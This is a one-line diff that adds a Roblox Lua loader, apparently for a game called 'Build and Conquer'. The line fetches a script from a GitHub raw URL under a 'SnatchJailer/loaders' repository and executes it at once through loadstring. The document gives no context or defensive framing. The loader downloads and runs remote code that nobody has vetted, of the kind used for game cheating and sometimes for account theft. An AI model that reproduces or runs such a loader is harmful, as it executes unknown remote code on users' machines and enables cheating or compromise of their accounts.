@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/build-and-conquer-v0-1-spam0-979bpdshgzmwlb.lua"))()
